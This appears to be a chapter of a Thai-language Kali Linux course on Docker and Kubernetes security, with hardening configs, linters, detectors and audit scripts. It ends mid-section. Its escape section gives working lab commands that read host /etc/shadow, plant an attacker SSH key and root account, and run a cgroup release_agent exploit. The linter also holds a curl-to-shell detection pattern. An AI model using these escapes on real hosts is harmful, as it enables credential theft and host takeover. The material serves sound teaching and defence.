# Part 90: Container Security (Docker/Kubernetes)

> **หลักสูตร Kali Linux ระดับมืออาชีพ** | ← [Part 89: Cloud Security](Part-89-Cloud-Security.md) | [Part 91: Advanced Exploit Development](Part-91-Advanced-Exploit-Development.md) →

---

## สารบัญ

1. [Container Security Overview](#1-container-security-overview)
2. [Docker Security Fundamentals](#2-docker-security-fundamentals)
3. [Docker Image Hardening](#3-docker-image-hardening)
4. [Container Escape Techniques](#4-container-escape-techniques)
5. [Kubernetes Architecture & Security](#5-kubernetes-architecture--security)
6. [Kubernetes RBAC](#6-kubernetes-rbac)
7. [Kubernetes Network Policies](#7-kubernetes-network-policies)
8. [Pod Security Standards](#8-pod-security-standards)
9. [Secret Management in Kubernetes](#9-secret-management-in-kubernetes)
10. [Container Image Scanning](#10-container-image-scanning)
11. [Runtime Security with Falco](#11-runtime-security-with-falco)
12. [Kubernetes Pentesting](#12-kubernetes-pentesting)
13. [Container Forensics](#13-container-forensics)
14. [Supply Chain Security](#14-supply-chain-security)
15. [สรุป Container Security](#15-สรุป-container-security)

---

## 1. Container Security Overview

Container Security ครอบคลุม 4 ด้านหลัก:

```
┌─────────────────────────────────────────────────────────┐
│                 Container Security Layers                │
├─────────────────────────────────────────────────────────┤
│  1. Build Security    │ Image scanning, Dockerfile lint  │
│  2. Deploy Security   │ RBAC, Network Policy, PSS        │
│  3. Runtime Security  │ Falco, Seccomp, AppArmor         │
│  4. Infra Security    │ Host hardening, etcd encryption  │
└─────────────────────────────────────────────────────────┘
```

### Attack Surface ของ Container

```python
# attack_surface_analysis.py
# วิเคราะห์ attack surface ของ container environment

ATTACK_SURFACES = {
    "image": [
        "vulnerable OS packages",
        "outdated application dependencies",
        "hardcoded secrets in layers",
        "excessive installed tools",
        "running as root user",
    ],
    "runtime": [
        "privileged container",
        "host network/PID/IPC namespace sharing",
        "dangerous volume mounts (/proc, /sys, /var/run/docker.sock)",
        "missing seccomp/AppArmor profiles",
        "writable root filesystem",
    ],
    "orchestration": [
        "overly permissive RBAC",
        "missing Network Policies",
        "secrets in environment variables",
        "unauthenticated kubelet API",
        "exposed etcd without TLS",
    ],
    "supply_chain": [
        "unsigned images",
        "untrusted base images",
        "compromised CI/CD pipeline",
        "malicious dependencies",
    ],
}

for layer, risks in ATTACK_SURFACES.items():
    print(f"\n[{layer.upper()}] Attack Surface:")
    for risk in risks:
        print(f"  - {risk}")
```

---

## 2. Docker Security Fundamentals

### Docker Architecture Security

```bash
# ตรวจสอบ Docker daemon configuration
docker info | grep -E "Security|Logging|Rootless"

# ดู Docker daemon security options
docker info --format '{{json .SecurityOptions}}' | python3 -m json.tool

# ตรวจสอบว่า Docker daemon รันด้วย user ไหน
ps aux | grep dockerd

# Docker bench security - automated security check
docker run --rm \
  -v /var/lib/docker:/var/lib/docker:ro \
  -v /etc/docker:/etc/docker:ro \
  -v /run/containerd:/run/containerd:ro \
  -v /sys/fs/cgroup:/sys/fs/cgroup:ro \
  -v /etc/passwd:/etc/passwd:ro \
  -v /etc/group:/etc/group:ro \
  --pid=host \
  --net=host \
  --cap-add audit_control \
  docker/docker-bench-security
```

### Docker Daemon Hardening (/etc/docker/daemon.json)

```json
{
  "icc": false,
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "10m",
    "max-file": "3"
  },
  "live-restore": true,
  "userland-proxy": false,
  "no-new-privileges": true,
  "seccomp-profile": "/etc/docker/seccomp/default.json",
  "userns-remap": "default",
  "experimental": false,
  "storage-driver": "overlay2",
  "tls": true,
  "tlscacert": "/etc/docker/ca.pem",
  "tlscert": "/etc/docker/server-cert.pem",
  "tlskey": "/etc/docker/server-key.pem",
  "hosts": ["fd://"],
  "default-ulimits": {
    "nofile": {
      "Name": "nofile",
      "Hard": 64000,
      "Soft": 64000
    }
  },
  "authorization-plugins": ["opa-docker-authz"]
}
```

### Rootless Docker

```bash
# ติดตั้ง Rootless Docker (ไม่ต้องใช้ root)
curl -fsSL https://get.docker.com/rootless | sh

# เพิ่ม environment variables
export PATH=/home/$USER/bin:$PATH
export DOCKER_HOST=unix:///run/user/$(id -u)/docker.sock

# เปิดใช้งาน service
systemctl --user start docker
systemctl --user enable docker

# ตรวจสอบ rootless mode
docker info | grep rootless
```

---

## 3. Docker Image Hardening

### Secure Dockerfile Template

```dockerfile
# Dockerfile.secure - Hardened multi-stage build

# ========== Build Stage ==========
FROM golang:1.21-alpine AS builder

# ติดตั้ง dependencies ที่จำเป็น
RUN apk add --no-cache git ca-certificates tzdata

# สร้าง non-root user สำหรับ final image
RUN adduser \
    --disabled-password \
    --gecos "" \
    --home "/nonexistent" \
    --shell "/sbin/nologin" \
    --no-create-home \
    --uid 65532 \
    appuser

WORKDIR /build

# Copy go.mod ก่อน เพื่อ cache layer
COPY go.mod go.sum ./
RUN go mod download && go mod verify

# Copy source code
COPY . .

# Build with security flags
RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build \
    -ldflags='-w -s -extldflags "-static"' \
    -o /app/server \
    ./cmd/server

# ========== Final Stage ==========
FROM scratch

# Copy SSL certs, timezone, user info
COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/
COPY --from=builder /usr/share/zoneinfo /usr/share/zoneinfo
COPY --from=builder /etc/passwd /etc/passwd
COPY --from=builder /etc/group /etc/group

# Copy binary เท่านั้น
COPY --from=builder /app/server /app/server

# ใช้ non-root user
USER 65532:65532

# Expose port (ไม่ใช้ privileged port)
EXPOSE 8080

# Health check
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
    CMD ["/app/server", "--health-check"]

ENTRYPOINT ["/app/server"]
```

### Dockerfile Security Linting

```python
# dockerfile_linter.py
# ตรวจสอบ Dockerfile security issues

import re
from pathlib import Path
from dataclasses import dataclass
from typing import List

@dataclass
class SecurityIssue:
    line_num: int
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW
    rule: str
    message: str
    line: str

class DockerfileSecurityLinter:
    def __init__(self):
        self.issues: List[SecurityIssue] = []
        
    def lint(self, dockerfile_path: str) -> List[SecurityIssue]:
        self.issues = []
        lines = Path(dockerfile_path).read_text().splitlines()
        
        has_user = False
        has_healthcheck = False
        uses_latest = False
        has_add = False
        
        for i, line in enumerate(lines, 1):
            line_stripped = line.strip()
            
            # Rule 1: ใช้ :latest tag
            if re.match(r'^FROM\s+\S+:latest', line_stripped, re.I):
                self.issues.append(SecurityIssue(
                    i, "HIGH", "DL3007",
                    "Using :latest tag - pin specific version for reproducibility",
                    line
                ))
            
            # Rule 2: root user
            if re.match(r'^USER\s+root', line_stripped, re.I):
                self.issues.append(SecurityIssue(
                    i, "CRITICAL", "DL3002",
                    "Container running as root user",
                    line
                ))
            
            # Rule 3: hardcoded secrets
            secret_patterns = [
                r'ENV\s+.*(?:PASSWORD|SECRET|KEY|TOKEN|API_KEY)\s*=\s*\S+',
                r'ARG\s+.*(?:PASSWORD|SECRET|KEY|TOKEN)',
                r'RUN\s+.*--password\s+\S+',
            ]
            for pattern in secret_patterns:
                if re.search(pattern, line_stripped, re.I):
                    self.issues.append(SecurityIssue(
                        i, "CRITICAL", "DL3020",
                        "Potential secret in Dockerfile - use --secret or runtime env",
                        line
                    ))
            
            # Rule 4: ใช้ ADD แทน COPY
            if re.match(r'^ADD\s+', line_stripped):
                has_add = True
                self.issues.append(SecurityIssue(
                    i, "MEDIUM", "DL3020",
                    "Use COPY instead of ADD (ADD can fetch remote URLs)",
                    line
                ))
            
            # Rule 5: sudo
            if re.search(r'\bsudo\b', line_stripped):
                self.issues.append(SecurityIssue(
                    i, "HIGH", "DL3004",
                    "Do not use sudo in containers",
                    line
                ))
            
            # Rule 6: curl | bash (remote code execution)
            if re.search(r'curl.*\|.*(?:bash|sh)', line_stripped):
                self.issues.append(SecurityIssue(
                    i, "CRITICAL", "DL3021",
                    "Piping curl to shell - verify checksums instead",
                    line
                ))
            
            # Rule 7: apt/yum โดยไม่ pin version
            if re.search(r'apt-get install', line_stripped) and '=' not in line_stripped:
                self.issues.append(SecurityIssue(
                    i, "LOW", "DL3008",
                    "Pin package versions with apt-get install pkg=version",
                    line
                ))
            
            # Track directives
            if re.match(r'^USER\s+(?!root)', line_stripped, re.I):
                has_user = True
            if re.match(r'^HEALTHCHECK\s+', line_stripped, re.I):
                has_healthcheck = True
        
        # Rules ที่ check ทั้ง file
        if not has_user:
            self.issues.append(SecurityIssue(
                0, "HIGH", "DL3002",
                "No non-root USER directive found",
                ""
            ))
        if not has_healthcheck:
            self.issues.append(SecurityIssue(
                0, "LOW", "DL3022",
                "No HEALTHCHECK instruction",
                ""
            ))
        
        return self.issues
    
    def report(self):
        if not self.issues:
            print("[+] No security issues found!")
            return
        
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        sorted_issues = sorted(self.issues, key=lambda x: severity_order.get(x.severity, 4))
        
        counts = {}
        for issue in sorted_issues:
            counts[issue.severity] = counts.get(issue.severity, 0) + 1
            
        print(f"\nDockerfile Security Report")
        print(f"===========================")
        for sev, count in counts.items():
            print(f"  {sev}: {count}")
        
        print("\nDetailed Findings:")
        for issue in sorted_issues:
            prefix = {
                "CRITICAL": "[!!!]",
                "HIGH": "[ ! ]",
                "MEDIUM": "[ M ]",
                "LOW": "[ L ]",
            }.get(issue.severity, "[ ? ]")
            
            line_info = f"Line {issue.line_num}: " if issue.line_num > 0 else ""
            print(f"\n{prefix} [{issue.rule}] {line_info}{issue.message}")
            if issue.line.strip():
                print(f"     {issue.line.strip()[:80]}")

# ตัวอย่างการใช้งาน
if __name__ == "__main__":
    import sys
    linter = DockerfileSecurityLinter()
    
    dockerfile = sys.argv[1] if len(sys.argv) > 1 else "Dockerfile"
    issues = linter.lint(dockerfile)
    linter.report()
    
    # Exit code based on severity
    has_critical = any(i.severity == "CRITICAL" for i in issues)
    sys.exit(1 if has_critical else 0)
```

---

## 4. Container Escape Techniques

### Lab Environment Setup

```bash
# สร้าง vulnerable container สำหรับทดสอบ (lab only!)
docker run --rm -it \
  --privileged \
  --name vuln-container \
  ubuntu:20.04 /bin/bash
```

### Technique 1: Privileged Container Escape

```bash
# ตรวจสอบว่า container เป็น privileged หรือไม่
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = full capabilities = privileged!

# หาก privileged: mount host filesystem
mkdir /tmp/host-fs
mount /dev/sda1 /tmp/host-fs   # หรือ /dev/xvda1, /dev/nvme0n1p1

# อ่าน /etc/shadow ของ host
cat /tmp/host-fs/etc/shadow

# เขียน SSH key เข้า root
mkdir -p /tmp/host-fs/root/.ssh
echo "ssh-rsa AAAAB3... attacker@kali" >> /tmp/host-fs/root/.ssh/authorized_keys

# เพิ่ม root user
echo "hacked:x:0:0:root:/root:/bin/bash" >> /tmp/host-fs/etc/passwd
echo "hacked:\$6\$salt\$hash:19000:0:99999:7:::" >> /tmp/host-fs/etc/shadow
```

### Technique 2: Docker Socket Escape

```bash
# ตรวจสอบ docker.sock
ls -la /var/run/docker.sock 2>/dev/null && echo "[VULN] Docker socket accessible!"

# ใช้ curl กับ Docker API
curl -s --unix-socket /var/run/docker.sock http://localhost/version

# สร้าง privileged container ใหม่ที่ mount host
curl -s --unix-socket /var/run/docker.sock \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "ubuntu",
    "Cmd": ["/bin/sh", "-c", "chroot /host cat /etc/shadow"],
    "Binds": ["/:/host"],
    "Privileged": true
  }' \
  http://localhost/containers/create?name=escape

# Start container
curl -s --unix-socket /var/run/docker.sock \
  -X POST \
  http://localhost/containers/escape/start

# ดู logs
curl -s --unix-socket /var/run/docker.sock \
  http://localhost/containers/escape/logs?stdout=1
```

### Technique 3: Namespace Escape via /proc

```bash
# ตรวจสอบ host PID namespace
ls /proc/1/root/ 2>/dev/null  # ถ้าเห็น host FS = vulnerable

# nsenter เพื่อออกจาก namespace
nsenter -t 1 -m -u -i -n -p -- /bin/bash
# -t 1 = target PID 1 (host init)
# -m = mount namespace
# -u = UTS namespace  
# -i = IPC namespace
# -n = network namespace
# -p = PID namespace
```

### Technique 4: cgroup Escape (CVE-2022-0492)

```bash
# ตรวจสอบ cgroup v1 release_agent
cat /proc/1/cgroup | head -5

# ตรวจสอบว่า mount cgroup ได้
cat /proc/self/mountinfo | grep cgroup

# cgroup escape script
cat << 'EOF' > /tmp/cgroup_escape.sh
#!/bin/bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* 2>/dev/null))
mkdir -p $d/w
echo 1 >$d/w/notify_on_release
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo $t/c >$d/release_agent
echo '#!/bin/bash' >/c  
echo "cat /etc/shadow > $t/o" >>/c
chmod +x /c
sh -c "echo 0 >$d/w/cgroup.procs"
sleep 1
cat /o
EOF
bash /tmp/cgroup_escape.sh
```

### Detection: Container Escape Indicators

```python
# escape_detector.py
# ตรวจจับความพยายาม container escape

import subprocess
import os
import stat
from pathlib import Path

class ContainerEscapeDetector:
    
    def check_privileged(self):
        """ตรวจสอบว่า container เป็น privileged"""
        try:
            with open("/proc/self/status") as f:
                for line in f:
                    if line.startswith("CapEff:"):
                        cap_eff = int(line.split()[1], 16)
                        # Full capabilities = privileged
                        if cap_eff == 0x000001ffffffffff:
                            return True, "Container is PRIVILEGED"
                        # Check dangerous caps
                        dangerous_caps = {
                            1: "CAP_DAC_READ_SEARCH",
                            12: "CAP_NET_ADMIN",
                            21: "CAP_SYS_ADMIN",
                        }
                        for bit, name in dangerous_caps.items():
                            if cap_eff & (1 << bit):
                                return True, f"Dangerous capability: {name}"
        except:
            pass
        return False, "Normal capabilities"
    
    def check_docker_socket(self):
        """ตรวจสอบ Docker socket"""
        socket_path = "/var/run/docker.sock"
        if os.path.exists(socket_path):
            mode = os.stat(socket_path).st_mode
            if stat.S_ISSOCK(mode):
                return True, f"Docker socket accessible at {socket_path}"
        return False, "No Docker socket"
    
    def check_host_namespace(self):
        """ตรวจสอบว่า share namespace กับ host"""
        results = []
        
        # Check PID namespace
        try:
            container_pid_ns = os.readlink("/proc/self/ns/pid")
            host_pid_ns = os.readlink("/proc/1/ns/pid")
            if container_pid_ns == host_pid_ns:
                results.append("Sharing host PID namespace")
        except:
            pass
        
        # Check network namespace
        try:
            container_net_ns = os.readlink("/proc/self/ns/net")
            host_net_ns = os.readlink("/proc/1/ns/net")
            if container_net_ns == host_net_ns:
                results.append("Sharing host network namespace")
        except:
            pass
        
        return len(results) > 0, results
    
    def check_dangerous_mounts(self):
        """ตรวจสอบ dangerous volume mounts"""
        dangerous = []
        dangerous_paths = [
            "/proc/sysrq-trigger",
            "/proc/sys/kernel",
            "/sys/fs/cgroup",
            "/dev",
        ]
        
        try:
            with open("/proc/mounts") as f:
                mounts = f.read()
            
            for path in dangerous_paths:
                if path in mounts:
                    dangerous.append(f"Dangerous mount: {path}")
        except:
            pass
        
        return len(dangerous) > 0, dangerous
    
    def run_all_checks(self):
        print("Container Security Check")
        print("=" * 50)
        
        checks = [
            ("Privileged Container", self.check_privileged),
            ("Docker Socket", self.check_docker_socket),
            ("Host Namespace", lambda: self.check_host_namespace()),
            ("Dangerous Mounts", self.check_dangerous_mounts),
        ]
        
        for name, check_fn in checks:
            try:
                vulnerable, detail = check_fn()
                status = "[VULN]" if vulnerable else "[ OK ]"
                if isinstance(detail, list):
                    print(f"\n{status} {name}:")
                    for d in detail:
                        print(f"       - {d}")
                else:
                    print(f"{status} {name}: {detail}")
            except Exception as e:
                print(f"[ ?? ] {name}: Error - {e}")

if __name__ == "__main__":
    detector = ContainerEscapeDetector()
    detector.run_all_checks()
```

---

## 5. Kubernetes Architecture & Security

### K8s Security Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                   Kubernetes Cluster                         │
│                                                             │
│  ┌──────────────────────────────────────────────────────┐  │
│  │                   Control Plane                       │  │
│  │  ┌──────────┐  ┌──────────┐  ┌────────────────────┐ │  │
│  │  │ API      │  │  etcd    │  │  Controller Manager │ │  │
│  │  │ Server   │  │ (TLS!)   │  │  Scheduler          │ │  │
│  │  └──────────┘  └──────────┘  └────────────────────┘ │  │
│  └──────────────────────────────────────────────────────┘  │
│                                                             │
│  ┌──────────────────┐  ┌──────────────────────────────┐   │
│  │    Worker Node 1  │  │       Worker Node 2           │   │
│  │  ┌────────────┐  │  │  ┌────────────────────────┐  │   │
│  │  │  kubelet   │  │  │  │       kubelet           │  │   │
│  │  │  kube-proxy│  │  │  │       kube-proxy        │  │   │
│  │  └────────────┘  │  │  └────────────────────────┘  │   │
│  │  ┌────────────┐  │  │  ┌──────┐ ┌──────┐          │   │
│  │  │  Pod A     │  │  │  │Pod B │ │Pod C │          │   │
│  │  └────────────┘  │  │  └──────┘ └──────┘          │   │
│  └──────────────────┘  └──────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

### CIS Kubernetes Benchmark Checker

```python
# k8s_cis_checker.py
# ตรวจสอบ Kubernetes ตาม CIS Benchmark

import subprocess
import json
import yaml
from dataclasses import dataclass
from typing import List, Optional

@dataclass
class CISFinding:
    benchmark_id: str
    title: str
    status: str  # PASS, FAIL, WARN, INFO
    detail: str
    remediation: str

class K8sCISChecker:
    def __init__(self):
        self.findings: List[CISFinding] = []
    
    def _kubectl(self, *args) -> dict:
        """รัน kubectl command"""
        try:
            result = subprocess.run(
                ["kubectl"] + list(args) + ["-o", "json"],
                capture_output=True, text=True, timeout=30
            )
            return json.loads(result.stdout) if result.returncode == 0 else {}
        except:
            return {}
    
    def _kubectl_get_yaml(self, *args) -> str:
        """รัน kubectl command และได้ YAML"""
        try:
            result = subprocess.run(
                ["kubectl"] + list(args),
                capture_output=True, text=True, timeout=30
            )
            return result.stdout if result.returncode == 0 else ""
        except:
            return ""
    
    # === 4.1 Worker Node Configuration ===
    
    def check_4_1_1_kubelet_anonymous_auth(self):
        """4.1.1 Ensure anonymous-auth is disabled"""
        config = self._kubectl_get_yaml(
            "get", "configmap", "kubelet-config", 
            "-n", "kube-system"
        )
        
        if "anonymous:\n    enabled: false" in config or \
           "anonymous: {enabled: false}" in config:
            self.findings.append(CISFinding(
                "4.1.1", "kubelet anonymous-auth disabled",
                "PASS", "anonymous-auth is disabled",
                "N/A"
            ))
        else:
            self.findings.append(CISFinding(
                "4.1.1", "kubelet anonymous-auth disabled",
                "FAIL", "anonymous-auth may be enabled",
                "Set --anonymous-auth=false in kubelet config"
            ))
    
    # === 5.1 RBAC ===
    
    def check_5_1_1_cluster_admin_binding(self):
        """5.1.1 Ensure cluster-admin role is not overused"""
        bindings = self._kubectl(
            "get", "clusterrolebindings",
            "-o", "json"
        )
        
        cluster_admins = []
        for binding in bindings.get("items", []):
            if binding.get("roleRef", {}).get("name") == "cluster-admin":
                subjects = binding.get("subjects", [])
                for subj in subjects:
                    if subj.get("name") not in ["system:masters"]:
                        cluster_admins.append(
                            f"{subj.get('kind')}/{subj.get('name')}"
                        )
        
        if not cluster_admins:
            self.findings.append(CISFinding(
                "5.1.1", "cluster-admin bindings",
                "PASS", "No unexpected cluster-admin bindings",
                "N/A"
            ))
        else:
            self.findings.append(CISFinding(
                "5.1.1", "cluster-admin bindings",
                "FAIL",
                f"Unexpected cluster-admin: {cluster_admins}",
                "Review and remove unnecessary cluster-admin bindings"
            ))
    
    def check_5_1_3_wildcards_in_roles(self):
        """5.1.3 Minimize use of wildcards in Roles"""
        all_roles = []
        
        cluster_roles = self._kubectl("get", "clusterroles")
        roles = self._kubectl("get", "roles", "--all-namespaces")
        
        def check_wildcards(role):
            wildcards = []
            for rule in role.get("rules", []):
                has_wildcard_verb = "*" in rule.get("verbs", [])
                has_wildcard_resource = "*" in rule.get("resources", [])
                has_wildcard_api = "*" in rule.get("apiGroups", [])
                
                if has_wildcard_verb or has_wildcard_resource or has_wildcard_api:
                    wildcards.append(role.get("metadata", {}).get("name"))
            return wildcards
        
        wild_roles = []
        for role in cluster_roles.get("items", []) + roles.get("items", []):
            name = role.get("metadata", {}).get("name", "")
            # ข้าม system roles
            if name.startswith("system:"):
                continue
            wildcards = check_wildcards(role)
            wild_roles.extend(wildcards)
        
        if wild_roles:
            self.findings.append(CISFinding(
                "5.1.3", "Wildcard roles",
                "WARN",
                f"Roles with wildcards: {set(wild_roles)}",
                "Replace wildcard permissions with specific permissions"
            ))
        else:
            self.findings.append(CISFinding(
                "5.1.3", "Wildcard roles",
                "PASS", "No custom roles with wildcards",
                "N/A"
            ))
    
    # === 5.2 Pod Security ===
    
    def check_5_2_1_privileged_pods(self):
        """5.2.1 Minimize privileged containers"""
        pods = self._kubectl("get", "pods", "--all-namespaces")
        
        privileged_pods = []
        for pod in pods.get("items", []):
            ns = pod["metadata"]["namespace"]
            name = pod["metadata"]["name"]
            
            for container in pod.get("spec", {}).get("containers", []):
                security_ctx = container.get("securityContext", {})
                if security_ctx.get("privileged") is True:
                    privileged_pods.append(f"{ns}/{name}/{container['name']}")
        
        if privileged_pods:
            self.findings.append(CISFinding(
                "5.2.1", "Privileged containers",
                "FAIL",
                f"Privileged containers found: {privileged_pods}",
                "Remove privileged: true from pod specs"
            ))
        else:
            self.findings.append(CISFinding(
                "5.2.1", "Privileged containers",
                "PASS", "No privileged containers",
                "N/A"
            ))
    
    def check_5_2_5_containers_run_as_root(self):
        """5.2.5 Minimize containers with root"""
        pods = self._kubectl("get", "pods", "--all-namespaces")
        
        root_pods = []
        for pod in pods.get("items", []):
            ns = pod["metadata"]["namespace"]
            name = pod["metadata"]["name"]
            spec = pod.get("spec", {})
            
            pod_ctx = spec.get("securityContext", {})
            pod_run_as_non_root = pod_ctx.get("runAsNonRoot")
            pod_run_as_user = pod_ctx.get("runAsUser")
            
            for container in spec.get("containers", []):
                ctx = container.get("securityContext", {})
                
                run_as_non_root = ctx.get("runAsNonRoot", pod_run_as_non_root)
                run_as_user = ctx.get("runAsUser", pod_run_as_user)
                
                is_root = (
                    run_as_non_root is False or
                    run_as_user == 0 or
                    (run_as_non_root is None and run_as_user is None)
                )
                
                if is_root:
                    root_pods.append(f"{ns}/{name}/{container['name']}")
        
        if root_pods:
            self.findings.append(CISFinding(
                "5.2.5", "Containers running as root",
                "WARN",
                f"May run as root: {len(root_pods)} containers",
                "Set runAsNonRoot: true and runAsUser: <non-zero>"
            ))
    
    def run_checks(self):
        checks = [
            self.check_4_1_1_kubelet_anonymous_auth,
            self.check_5_1_1_cluster_admin_binding,
            self.check_5_1_3_wildcards_in_roles,
            self.check_5_2_1_privileged_pods,
            self.check_5_2_5_containers_run_as_root,
        ]
        
        for check in checks:
            try:
                check()
            except Exception as e:
                print(f"Error running {check.__name__}: {e}")
        
        self.print_report()
    
    def print_report(self):
        print("\nKubernetes CIS Benchmark Report")
        print("=" * 60)
        
        counts = {"PASS": 0, "FAIL": 0, "WARN": 0, "INFO": 0}
        for f in self.findings:
            counts[f.status] = counts.get(f.status, 0) + 1
        
        print(f"PASS: {counts['PASS']} | FAIL: {counts['FAIL']} | WARN: {counts['WARN']}")
        print()
        
        for f in self.findings:
            icon = {"PASS": "✓", "FAIL": "✗", "WARN": "!", "INFO": "i"}.get(f.status, "?")
            print(f"[{icon}] [{f.benchmark_id}] {f.title}")
            print(f"    Status: {f.status}")
            print(f"    Detail: {f.detail}")
            if f.status in ["FAIL", "WARN"]:
                print(f"    Fix:    {f.remediation}")
            print()

if __name__ == "__main__":
    checker = K8sCISChecker()
    checker.run_checks()
```

---

## 6. Kubernetes RBAC

### RBAC Best Practices

```yaml
# rbac-least-privilege.yaml
# ตัวอย่าง RBAC ที่ปลอดภัย (Least Privilege)

---
# ServiceAccount สำหรับ application
apiVersion: v1
kind: ServiceAccount
metadata:
  name: app-service-account
  namespace: production
automountServiceAccountToken: false  # ปิด auto-mount

---
# Role - สิทธิ์เฉพาะ namespace
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: app-role
  namespace: production
rules:
  # อนุญาตเฉพาะ read pods ใน namespace นี้
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list"]
  # อนุญาต read specific secrets เท่านั้น
  - apiGroups: [""]
    resources: ["secrets"]
    resourceNames: ["app-config-secret"]  # ระบุชื่อ secret เฉพาะ
    verbs: ["get"]
  # อนุญาต read configmaps
  - apiGroups: [""]
    resources: ["configmaps"]
    resourceNames: ["app-config"]
    verbs: ["get"]

---
# RoleBinding
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: app-role-binding
  namespace: production
subjects:
  - kind: ServiceAccount
    name: app-service-account
    namespace: production
roleRef:
  kind: Role
  name: app-role
  apiGroup: rbac.authorization.k8s.io

---
# ClusterRole สำหรับ monitoring (read-only)
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: monitoring-reader
rules:
  - apiGroups: [""]
    resources:
      - nodes
      - nodes/metrics
      - pods
      - services
      - endpoints
    verbs: ["get", "list", "watch"]
  - apiGroups: ["extensions", "apps"]
    resources:
      - deployments
      - replicasets
    verbs: ["get", "list", "watch"]
  - nonResourceURLs: ["/metrics", "/healthz"]
    verbs: ["get"]
```

### RBAC Audit Script

```python
# rbac_auditor.py
# ตรวจสอบ RBAC permissions ที่อันตราย

import subprocess
import json
from typing import List, Dict

class RBACauditor:
    
    DANGEROUS_VERBS = ["create", "delete", "update", "patch", "escalate", "bind"]
    SENSITIVE_RESOURCES = [
        "secrets", "pods/exec", "pods/attach",
        "serviceaccounts/token", "clusterroles",
        "clusterrolebindings", "roles", "rolebindings"
    ]
    
    def get_all_roles(self) -> List[Dict]:
        """ดึง ClusterRoles และ Roles ทั้งหมด"""
        all_roles = []
        
        for resource in ["clusterroles", "roles"]:
            try:
                result = subprocess.run(
                    ["kubectl", "get", resource, "--all-namespaces", "-o", "json"],
                    capture_output=True, text=True
                )
                data = json.loads(result.stdout)
                all_roles.extend(data.get("items", []))
            except:
                pass
        
        return all_roles
    
    def audit_roles(self, roles: List[Dict]) -> List[Dict]:
        """ตรวจสอบ roles ที่มี excessive permissions"""
        findings = []
        
        for role in roles:
            name = role["metadata"]["name"]
            namespace = role["metadata"].get("namespace", "cluster-wide")
            kind = role["kind"]
            
            # ข้าม system roles
            if name.startswith("system:"):
                continue
            
            issues = []
            
            for rule in role.get("rules", []):
                verbs = rule.get("verbs", [])
                resources = rule.get("resources", [])
                api_groups = rule.get("apiGroups", [])
                resource_names = rule.get("resourceNames", [])
                
                # Check 1: wildcard permissions
                if "*" in verbs and "*" in resources:
                    issues.append({
                        "severity": "CRITICAL",
                        "issue": "Full wildcard permissions (verbs=* resources=*)"
                    })
                elif "*" in verbs:
                    issues.append({
                        "severity": "HIGH",
                        "issue": f"Wildcard verbs on resources: {resources}"
                    })
                
                # Check 2: access to secrets without resource name restriction
                if "secrets" in resources and not resource_names:
                    if any(v in verbs for v in ["get", "list", "watch", "*"]):
                        issues.append({
                            "severity": "HIGH",
                            "issue": "Can list/read all secrets (no resourceNames restriction)"
                        })
                
                # Check 3: pod exec/attach
                for sensitive in ["pods/exec", "pods/attach"]:
                    if sensitive in resources or ("pods" in resources and 
                                                   any(v in verbs for v in ["create", "*"])):
                        if "create" in verbs or "*" in verbs:
                            issues.append({
                                "severity": "HIGH",
                                "issue": f"Can exec into pods ({sensitive})"
                            })
                
                # Check 4: ability to escalate privileges
                if "escalate" in verbs or "bind" in verbs:
                    issues.append({
                        "severity": "CRITICAL",
                        "issue": f"Has privilege escalation verbs: {[v for v in verbs if v in ['escalate','bind']]}"
                    })
                
                # Check 5: can create/modify RBAC
                rbac_resources = ["clusterroles", "clusterrolebindings", "roles", "rolebindings"]
                if any(r in resources for r in rbac_resources):
                    if any(v in verbs for v in ["create", "update", "patch", "delete", "*"]):
                        issues.append({
                            "severity": "CRITICAL",
                            "issue": "Can modify RBAC (potential privilege escalation)"
                        })
            
            if issues:
                findings.append({
                    "kind": kind,
                    "name": name,
                    "namespace": namespace,
                    "issues": issues
                })
        
        return findings
    
    def get_bindings_for_role(self, role_name: str, kind: str) -> List[Dict]:
        """หา bindings ที่ใช้ role นี้"""
        bindings = []
        
        resource = "clusterrolebindings" if kind == "ClusterRole" else "rolebindings"
        try:
            result = subprocess.run(
                ["kubectl", "get", resource, "--all-namespaces", "-o", "json"],
                capture_output=True, text=True
            )
            data = json.loads(result.stdout)
            
            for binding in data.get("items", []):
                if binding.get("roleRef", {}).get("name") == role_name:
                    subjects = binding.get("subjects", [])
                    for subj in subjects:
                        bindings.append({
                            "type": subj.get("kind"),
                            "name": subj.get("name"),
                            "namespace": subj.get("namespace", "")
                        })
        except:
            pass
        
        return bindings
    
    def run_audit(self):
        print("Kubernetes RBAC Security Audit")
        print("=" * 60)
        
        roles = self.get_all_roles()
        findings = self.audit_roles(roles)
        
        print(f"\nAnalyzed {len(roles)} roles, found {len(findings)} with issues\n")
        
        for finding in findings:
            print(f"{'='*50}")
            print(f"Role: {finding['kind']}/{finding['name']}")
            if finding['namespace'] != 'cluster-wide':
                print(f"Namespace: {finding['namespace']}")
            
            for issue in finding['issues']:
                sev = issue['severity']
                icon = "[!!!]" if sev == "CRITICAL" else "[ ! ]"
                print(f"  {icon} {sev}: {issue['issue']}")
            
            bindings = self.get_bindings_for_role(
                finding['name'], finding['kind']
            )
            if bindings:
                print(f"  Bound to:")
                for b in bindings:
                    print(f"    - {b['type']}/{b['name']}")
            print()

if __name__ == "__main__":
    auditor = RBACauditor()
    auditor.run_audit()
```

---

## 7. Kubernetes Network Policies

### Default Deny All Policy

```yaml
# network-policy-default-deny.yaml
# Default deny all ingress และ egress

apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}  # เลือก pods ทั้งหมดใน namespace
  policyTypes:
